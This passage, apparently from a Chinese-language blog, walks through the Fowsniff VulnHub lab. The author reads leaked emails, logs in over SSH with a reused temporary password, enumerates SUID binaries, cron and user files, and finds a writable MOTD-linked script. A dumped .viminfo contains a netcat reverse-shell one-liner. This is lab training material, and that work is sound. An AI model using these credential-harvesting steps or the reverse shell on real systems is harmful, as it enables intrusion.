class="hljs-string">&quot;S1ck3nBluff+secureshell&quot;</span><br><br>You MUST change this password as soon as possible, and you will <span class="hljs-keyword">do</span> so under my<br>guidance. I saw the leak the attacker posted online, and I must say that your<br>passwords were not very secure.<br><br>Come see me <span class="hljs-keyword">in</span> my office at your earliest convenience and we<span class="hljs-string">&#x27;ll set it up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Thanks,</span><br><span class="hljs-string">A.J Stone</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure>

<p>简单阅读理解一下，邮件1告诉我们临时的SSH登录密码是”S1ck3nBluff+secureshell”，但是stone警告员工登上了记得改。但是谁知道我们的seina是不是铁头娃，万一就是没改就是玩呢？先试试再说。可惜seina还真改了，可恶。</p>
<p>别急，我们还有第二封邮件，看看第二封说了啥。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">retr 2<br>+OK 1280 octets<br>Return-Path: &lt;baksteen@fowsniff&gt;<br>X-Original-To: seina@fowsniff<br>Delivered-To: seina@fowsniff<br>Received: by fowsniff (Postfix, from userid 1004)<br>        <span class="hljs-built_in">id</span> 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)<br>To: seina@fowsniff<br>Subject: You missed out!<br>Message-Id: &lt;20180313185405.101CA1AC2@fowsniff&gt;<br>Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)<br>From: baksteen@fowsniff<br><br>Devin,<br><br>You should have seen the brass lay into AJ today!<br>We are going to be talking about this one <span class="hljs-keyword">for</span> a looooong time hahaha.<br>Who knew the regional manager had been <span class="hljs-keyword">in</span> the navy? She was swearing like a sailor!<br><br>I don<span class="hljs-string">&#x27;t know what kind of pneumonia or something you brought back with</span><br><span class="hljs-string">you from your camping trip, but I think I&#x27;</span>m coming down with it myself.<br>How long have you been gone - a week?<br>Next time you<span class="hljs-string">&#x27;re going to get sick and miss the managerial blowout of the century,</span><br><span class="hljs-string">at least keep it to yourself!</span><br><span class="hljs-string"></span><br><span class="hljs-string">I&#x27;</span>m going to <span class="hljs-built_in">head</span> home early and eat some chicken soup. <br>I think I just got an email from Stone, too, but it<span class="hljs-string">&#x27;s probably just some</span><br><span class="hljs-string">&quot;Let me explain the tone of my meeting with management&quot; face-saving mail.</span><br><span class="hljs-string">I&#x27;</span>ll <span class="hljs-built_in">read</span> it when I get back.<br><br>Feel better,<br><br>Skyler<br><br>PS: Make sure you change your email password. <br>AJ had been telling us to <span class="hljs-keyword">do</span> that right before Captain Profanity showed up.<br><br>.<br></code></pre></td></tr></table></figure>

<p>我们的反卷斗士baksteen下班直接回家喝鸡汤去了，邮件里还不忘锐评区域经理stone发的邮件多半是在挽尊，说打算回来再看。最后还不忘提醒seina改邮箱密码。</p>
<p>然而这小子没看AJ的邮件，那不就说明他不知道ssh那事。那他密码铁没改。</p>
<p>登陆试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ ssh baksteen@192.168.56.107   <br>baksteen@192.168.56.107<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">                            _____                       _  __  __  </span><br><span class="hljs-string">      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  </span><br><span class="hljs-string">   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &#x27;</span>_ \| | |_| |_   <br>.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  <br>-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   <br>-:      y.      dssssssso                ____                      <br>-:      y.      dssssssso               / ___|___  _ __ _ __        <br>-:      y.      dssssssso              | |   / _ \| <span class="hljs-string">&#x27;__| &#x27;</span>_ \     <br>-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  <br>-:      o.      yssssssso               \____\___/|_|  | .__/  (_) <br>-:    .+mdddddddmyyyyyhy:                              |_|        <br>-: -odMMMMMMMMMMmhhdy/.    <br>.ohdddddddddddddho:                  Delivering Solutions<br><br><br>   ****  Welcome to the Fowsniff Corporate Server! **** <br><br>              ---------- NOTICE: ----------<br><br> * Due to the recent security breach, we are running on a very minimal system.<br> * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.<br><br><br>Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36<br>baksteen@fowsniff:~$ <span class="hljs-built_in">whoami</span><br>baksteen<br>baksteen@fowsniff:~$ <span class="hljs-built_in">pwd</span><br>/home/baksteen<br>baksteen@fowsniff:~$ <span class="hljs-built_in">uname</span> -a<br>Linux fowsniff 4.4.0-116-generic <span class="hljs-comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>

<p>果然，舒服了，成功拿到shell。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>之所以说这个靶机比较好是因为他里面用户权限管理和分组都弄成了公司里的模式，组分成了root，user以及各个个人组，很真实。</p>
<p>废话不多说，手动枚举该干的活不能少干。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> baksteen: <br>Sorry, user baksteen may not run sudo on fowsniff.<br></code></pre></td></tr></table></figure>

<p>没权限捏。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>/bin/mount<br>/bin/fusermount<br>/bin/umount<br>/bin/ping<br>/bin/su<br>/bin/ntfs-3g<br>/bin/ping6<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/passwd<br>/usr/bin/procmail<br>/usr/bin/sudo<br>/usr/bin/chsh<br></code></pre></td></tr></table></figure>

<p>也没啥能用的set SUID的bin文件供我们提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/opt/cube$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>没啥自动任务。</p>
<p>老三样整完了，手动看看各个目录里的文件看看吧。</p>
<p>你可以错过冬日的暖阳，也可以错过夏日的微风，但你一定不能错过多用户环境检索用户遗留的凭证。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/home$ ll<br>total 44<br>drwxr-xr-x 11 root     root     4096 Mar  8  2018 ./<br>drwxr-xr-x 22 root     root     4096 Mar  9  2018 ../<br>drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 baksteen/<br>drwxrwx---  3 mauer    mauer    4096 Mar 11  2018 mauer/<br>drwxrwx---  3 mursten  mursten  4096 Mar 11  2018 mursten/<br>drwxrwx---  3 mustikka mustikka 4096 Mar 11  2018 mustikka/<br>drwxrwx---  3 parede   parede   4096 Mar 11  2018 parede/<br>drwxrwx---  3 sciana   sciana   4096 Mar 11  2018 sciana/<br>drwxrwx---  4 seina    seina    4096 Mar 11  2018 seina/<br>drwxrwx---  4 stone    stone    4096 Mar 13  2018 stone/<br>drwxrwx---  3 tegel    tegel    4096 Mar 11  2018 tegel/<br>baksteen@fowsniff:/home$ grep -R -i pass /home/* 2&gt;/dev/null<br>/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:The temporary password <span class="hljs-keyword">for</span> SSH is <span class="hljs-string">&quot;S1ck3nBluff+secureshell&quot;</span><br>/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:You MUST change this password as soon as possible, and you will <span class="hljs-keyword">do</span> so under my<br>/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:passwords were not very secure.<br></code></pre></td></tr></table></figure>

<p>然而系统管理员把权限配置的很好，根本就进不去其他用户的目录。</p>
<p>行，看不了别人的还看不了自己的吗，看看baksteen老哥还给我们留下来什么宝贝。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:~$ ll<br>total 40<br>drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 ./<br>drwxr-xr-x 11 root     root     4096 Mar  8  2018 ../<br>-rw-------  1 baksteen <span class="hljs-built_in">users</span>       1 Mar 13  2018 .bash_history<br>-rw-r--r--  1 baksteen <span class="hljs-built_in">users</span>     220 Aug 31  2015 .bash_logout<br>-rw-r--r--  1 baksteen <span class="hljs-built_in">users</span>    3771 Aug 31  2015 .bashrc<br>drwx------  2 baksteen <span class="hljs-built_in">users</span>    4096 Mar  8  2018 .cache/<br>-rw-r--r--  1 baksteen <span class="hljs-built_in">users</span>       0 Mar  9  2018 .lesshsQ<br>drwx------  5 baksteen <span class="hljs-built_in">users</span>    4096 Mar  9  2018 Maildir/<br>-rw-r--r--  1 baksteen <span class="hljs-built_in">users</span>     655 May 16  2017 .profile<br>-rw-r--r--  1 baksteen <span class="hljs-built_in">users</span>      97 Mar  9  2018 term.txt<br>-rw-------  1 baksteen <span class="hljs-built_in">users</span>    2981 Mar 13  2018 .viminfo<br></code></pre></td></tr></table></figure>

<p>有txt先看txt。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:~$ <span class="hljs-built_in">cat</span> term.txt <br>I wonder <span class="hljs-keyword">if</span> the person <span class="hljs-built_in">who</span> coined the term <span class="hljs-string">&quot;One Hit Wonder&quot;</span> <br>came up with another other phrases.<br></code></pre></td></tr></table></figure>

<p>没用，再翻翻Maildir，发现里面也没啥有用的东西。</p>
<p>那接下来就看看<code>.bash_history</code>和<code>.viminfo</code>有没有给我们留下点什么吧。</p>
<p>出师未捷，<code>.bash_history</code>是空的。再看看<code>.viminfo</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:~$ <span class="hljs-built_in">cat</span> .viminfo <br><span class="hljs-comment"># This viminfo file was generated by Vim 7.4.</span><br><span class="hljs-comment"># You may edit it if you&#x27;re careful!</span><br><br><span class="hljs-comment"># Value of &#x27;encoding&#x27; when this file was written</span><br>*encoding=utf-8<br><br><br><span class="hljs-comment"># hlsearch on (H) or off (h):</span><br>~h<br><span class="hljs-comment"># Command Line History (newest to oldest):</span><br>:wq!<br>:w!<br>:q!<br>:Q!<br><br><span class="hljs-comment"># Search String History (newest to oldest):</span><br>?/tmp/f; <span class="hljs-built_in">mkfifo</span> /tmp/f; <span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc local.machine.ip.addr PORTNUM &gt; /tmp/f<br><br><span class="hljs-comment"># Expression History (newest to oldest):</span><br><br><span class="hljs-comment"># Input Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Input Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Registers:</span><br><span class="hljs-string">&quot;&quot;</span>-     CHAR    0<br>        e<br><br><span class="hljs-comment"># File marks:</span><br><span class="hljs-string">&#x27;0  11  0  ~/email_to_seina.txt</span><br><span class="hljs-string">&#x27;</span>1  8  18  /tmp/pytest/pytest.py<br><span class="hljs-string">&#x27;2  10  11  /tmp/pytest/pytest.py</span><br><span class="hljs-string">&#x27;</span>3  20  6  /tmp/pytest/pytest.py<br><span class="hljs-string">&#x27;4  23  13  /tmp/pytest/pytest.py</span><br><span class="hljs-string">&#x27;</span>5  4  14  pytest.py<br><span class="hljs-string">&#x27;6  1  40  /tmp/bak_test/script.sh</span><br><span class="hljs-string">&#x27;</span>7  33  40  ~/jokes3.txt<br><span class="hljs-string">&#x27;8  46  0  ~/email_to_seina.txt</span><br><span class="hljs-string">&#x27;</span>9  44  86  ~/email_to_seina.txt<br><br><span class="hljs-comment"># Jumplist (newest first):</span><br>-<span class="hljs-string">&#x27;  11  0  ~/email_to_seina.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/email_to_seina.txt<br>-<span class="hljs-string">&#x27;  8  18  /tmp/pytest/pytest.py</span><br><span class="hljs-string">-&#x27;</span>  1  0  /tmp/pytest/pytest.py<br>-<span class="hljs-string">&#x27;  10  11  /tmp/pytest/pytest.py</span><br><span class="hljs-string">-&#x27;</span>  20  6  /tmp/pytest/pytest.py<br>-<span class="hljs-string">&#x27;  23  13  /tmp/pytest/pytest.py</span><br><span class="hljs-string">-&#x27;</span>  4  14  pytest.py<br>-<span class="hljs-string">&#x27;  1  0  pytest.py</span><br><span class="hljs-string">-&#x27;</span>  1  40  /tmp/bak_test/script.sh<br>-<span class="hljs-string">&#x27;  33  40  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  46  0  ~/email_to_seina.txt</span><br><span class="hljs-string">-&#x27;</span>  44  86  ~/email_to_seina.txt<br>-<span class="hljs-string">&#x27;  52  39  ~/email_to_seina.txt</span><br><span class="hljs-string">-&#x27;</span>  33  40  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  1  0  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  40  /tmp/bak_test/script.sh<br>-<span class="hljs-string">&#x27;  33  40  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  33  40  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  4  14  pytest.py</span><br><span class="hljs-string">-&#x27;</span>  1  0  pytest.py<br>-<span class="hljs-string">&#x27;  1  40  /tmp/bak_test/script.sh</span><br><span class="hljs-string">-&#x27;</span>  33  40  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  1  0  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  33  40  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  1  0  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  40  /tmp/bak_test/script.sh<br>-<span class="hljs-string">&#x27;  33  40  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  33  40  ~/jokes3.txt</span><br><span class="hljs-string">-&#x27;</span>  1  0  ~/jokes3.txt<br>-<span class="hljs-string">&#x27;  4  14  pytest.py</span><br><span class="hljs-string">-&#x27;</span>  1  0  pytest.py<br>-<span class="hljs-string">&#x27;  1  40  /tmp/bak_test/script.sh</span><br><span class="hljs-string">-&#x27;</span>  33  40  ~/jokes3.txt<br><br><span class="hljs-comment"># History of marks within files (newest to oldest):</span><br><br>&gt; ~/email_to_seina.txt<br>        <span class="hljs-string">&quot;       11      0</span><br><span class="hljs-string">        ^       11      0</span><br><span class="hljs-string">        .       11      0</span><br><span class="hljs-string">        +       46      0</span><br><span class="hljs-string">        +       40      0</span><br><span class="hljs-string">        +       43      0</span><br><span class="hljs-string">        +       44      3</span><br><span class="hljs-string">        +       44      86</span><br><span class="hljs-string">        +       26      0</span><br><span class="hljs-string">        +       31      0</span><br><span class="hljs-string">        +       36      0</span><br><span class="hljs-string">        +       41      12</span><br><span class="hljs-string">        +       42      0</span><br><span class="hljs-string">        +       44      3</span><br><span class="hljs-string">        +       44      47</span><br><span class="hljs-string">        +       44      69</span><br><span class="hljs-string">        +       45      0</span><br><span class="hljs-string">        +       47      0</span><br><span class="hljs-string">        +       23      0</span><br><span class="hljs-string">        +       17      0</span><br><span class="hljs-string">        +       16      4</span><br><span class="hljs-string">        +       15      72</span><br><span class="hljs-string">        +       5       51</span><br><span class="hljs-string">        +       5       51</span><br><span class="hljs-string">        +       5       51</span><br><span class="hljs-string">        +       10      35</span><br><span class="hljs-string">        +       10      81</span><br><span class="hljs-string">        +       12      0</span><br><span class="hljs-string">        +       11      0</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /tmp/pytest/pytest.py</span><br><span class="hljs-string">        &quot;</span>       8       18<br>        ^       8       19<br>        .       8       18<br>        +       23      22<br>        +       23      24<br>        +       23      35<br>        +       23      28<br>        +       13      21<br>        +       23      0<br>        +       17      10<br>        +       16      30<br>        +       17      5<br>        +       20      6<br>        +       11      3<br>        +       11      0<br>        +       7       1<br>        +       8       5<br>        +       8       5<br>        +       8       10<br>        +       10      12<br>        +       8       18<br>        +       8       19<br>        +       9       9<br>        +       10      0<br>        +       8       18<br><br>&gt; /opt/cube/cube.sh<br>        <span class="hljs-string">&quot;       17      67</span><br><span class="hljs-string">        ^       17      68</span><br><span class="hljs-string">        .       17      67</span><br><span class="hljs-string">        +       15      62</span><br><span class="hljs-string">        +       1       8</span><br><span class="hljs-string">        +       3       8</span><br><span class="hljs-string">        +       17      8</span><br><span class="hljs-string">        +       1       10</span><br><span class="hljs-string">        +       17      0</span><br><span class="hljs-string">        +       17      67</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /etc/update-motd.d/cube.sh</span><br><span class="hljs-string">        &quot;</span>       14      0<br>        ^       14      0<br>        .       13      62<br>        +       13      62<br><br>&gt; /tmp/place/hi.txt<br>        <span class="hljs-string">&quot;       1       0</span><br><span class="hljs-string">        .       1       0</span><br><span class="hljs-string">        +       1       0</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /tmp/pytest/junk/a.sh</span><br><span class="hljs-string">        &quot;</span>       3       13<br>        ^       3       14<br>        .       3       13<br>        +       3       13<br><br>&gt; /tmp/pytest/junk/b<br>        <span class="hljs-string">&quot;       1       0</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /tmp/pytest/junk/scripto.sh</span><br><span class="hljs-string">        &quot;</span>       3       4<br>        ^       3       5<br>        .       3       5<br>        +       3       5<br><br>&gt; pytest.py<br>        <span class="hljs-string">&quot;       4       14</span><br><span class="hljs-string">        ^       4       15</span><br><span class="hljs-string">        .       4       14</span><br><span class="hljs-string">        +       4       14</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /tmp/bak_test/script.sh</span><br><span class="hljs-string">        &quot;</span>       1       40<br>        ^       1       41<br>        .       1       40<br>        +       1       40<br><br>&gt; ~/jokes3.txt<br>        <span class="hljs-string">&quot;       33      40</span><br><span class="hljs-string">        ^       33      41</span><br><span class="hljs-string">        .       33      30</span><br><span class="hljs-string">        +       33      30</span><br></code></pre></td></tr></table></figure>

<p>到底是baksteen老哥，虽然home目录下创的jokes3文件没了,&#x2F;tmp下自己写着玩的shell脚本和python文件都没了。</p>
<p>但是vim记录还是给我们留下了有用信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; /opt/cube/cube.sh<br>        &quot;       17      67<br>        ^       17      68<br>        .       17      67<br>        +       15      62<br>        +       1       8<br>        +       3       8<br>        +       17      8<br>        +       1       10<br>        +       17      0<br>        +       17      67<br><br>&gt; /etc/update-motd.d/cube.sh<br>        &quot;       14      0<br>        ^       14      0<br>        .       13      62<br>        +       13      62<br></code></pre></td></tr></table></figure>

<p>我们发现baksteen老哥可以编辑<code>/opt/cube/</code>目录下的<code>cube.sh</code>。</p>
<p>并且我们知道<code>/etc/update-motd.d</code>目录下是存放用于显示用户登录进来时的信息的脚本的。</p>
<p>我们看看&#x2F;etc&#x2F;update-motd.d目录下都有啥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/etc/update-motd.d$ ll<br>total 24<br>drwxr-xr-x  2 root root 4096 Mar 11  2018 ./<br>drwxr-xr-x 87 root root 4096 Mar 13  2018 ../<br>-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header*<br>-rwxr-xr-x  1 root root 1473 Mar  9  2018 10-help-text*<br>-rwxr-xr-x  1 root root  299 Jul 22  2016 91-release-upgrade*<br>-rwxr-xr-x  1 root root  604 Nov  5  2017 99-esm*<br></code></pre></td></tr></table></figure>

<p>虽然没有我们最想要的cube.sh，但是没准备写入header了呢？看看再说</p>
